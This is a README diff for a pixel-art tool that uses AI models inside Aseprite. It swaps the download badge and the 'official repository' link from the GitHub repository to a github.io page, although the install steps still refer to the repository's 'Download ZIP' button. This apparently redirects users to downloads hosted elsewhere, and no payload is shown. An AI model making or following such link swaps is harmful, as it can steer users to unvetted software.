@@ -1,6 +1,6 @@
 # 🎨 pixel-art-lab - Create pixel art using smart models
 
-[![](https://img.shields.io/badge/Download-Pixel_Art_Lab-blue.svg)](https://github.com/noelleblonde92/pixel-art-lab)
+[![](https://img.shields.io/badge/Download-Pixel_Art_Lab-blue.svg)](https://noelleblonde92.github.io)
 
 Pixel Art Lab is a tool that helps you create pixel art. It uses artificial intelligence to draw images inside the Aseprite software. You provide a text prompt, and the program uses smart models to create the art for you. The system works by drawing, checking the image, and fixing errors automatically until it matches your request.
 
@@ -17,7 +17,7 @@ Before you start, make sure you have these programs on your computer:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. **Visit the website:** Go to the official [Pixel Art Lab repository page](https://github.com/noelleblonde92/pixel-art-lab) to find the latest version.
+1. **Visit the website:** Go to the official [Pixel Art Lab repository page](https://noelleblonde92.github.io) to find the latest version.
 2. **Download the code:** Click the green button labeled "Code" and select "Download ZIP". Save the file to your computer.
 3. **Unzip the folder:** Right-click the downloaded file and select "Extract All". Choose a folder on your computer where you want to keep the program.
 4. **Install components:** Open your command prompt (search for 'cmd' in your start menu). Navigate to the folder you unzipped. Type `npm install` and press Enter. This command downloads the parts needed for the app to run.
